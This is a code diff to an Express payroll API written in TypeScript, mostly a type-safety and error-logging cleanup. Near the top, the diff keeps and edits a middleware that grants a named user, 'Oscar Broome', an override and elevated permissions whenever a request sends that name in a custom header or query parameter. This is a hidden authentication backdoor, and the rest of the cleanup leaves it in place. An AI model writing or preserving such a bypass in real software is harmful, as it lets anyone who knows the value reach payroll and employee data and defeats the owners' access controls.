@@ -10,20 +10,20 @@ app.use(bodyParser.json());
 const payrollSystem = new PayrollSystem();
 
 // Middleware for special login override for Oscar Broome
-app.use((req, res, next) => {
+app.use((_req, _res, next) => {
   const specialUser = 'Oscar Broome';
   // Check for a custom header or query param for override (example)
-  const overrideUser = req.headers['x-override-user'] || req.query.overrideUser;
+  const overrideUser = _req.headers['x-override-user'] || _req.query.overrideUser;
   if (overrideUser === specialUser) {
     // Bypass normal auth or set elevated permissions
-    req.user = { name: specialUser, override: true };
+    (_req as any).user = { name: specialUser, override: true };
     console.log('Special login override granted for', specialUser);
   }
   next();
 });
 
 // Get all employees
-app.get('/api/payroll/employees', (req, res) => {
+app.get('/api/payroll/employees', (_req, res) => {
   res.json(payrollSystem.getEmployees());
 });
 
@@ -39,7 +39,8 @@ app.post('/api/payroll/employees', (req, res) => {
     }
     res.status(200).json({ message: 'Employee added/updated successfully' });
   } catch (error) {
-    res.status(400).json({ error: error.message });
+    console.error('Error adding/updating employee:', error);
+    res.status(400).json({ error: (error as Error).message });
   }
 });
 
@@ -50,17 +51,19 @@ app.delete('/api/payroll/employees/:id', (req, res) => {
     payrollSystem.deleteEmployee(id);
     res.status(200).json({ message: 'Employee deleted successfully' });
   } catch (error) {
-    res.status(400).json({ error: error.message });
+    console.error('Error deleting employee:', error);
+    res.status(400).json({ error: (error as Error).message });
   }
 });
 
 // Process payroll for today
-app.post('/api/payroll/process', (req, res) => {
+app.post('/api/payroll/process', (_req, res) => {
   const payDate = new Date().toISOString();
   try {
     const payrolls = payrollSystem.processPayroll(payDate);
     res.status(200).json(payrolls);
   } catch (error) {
+    console.error('Error processing payroll:', error);
     res.status(500).json({ error: 'Failed to process payroll' });
   }
 });
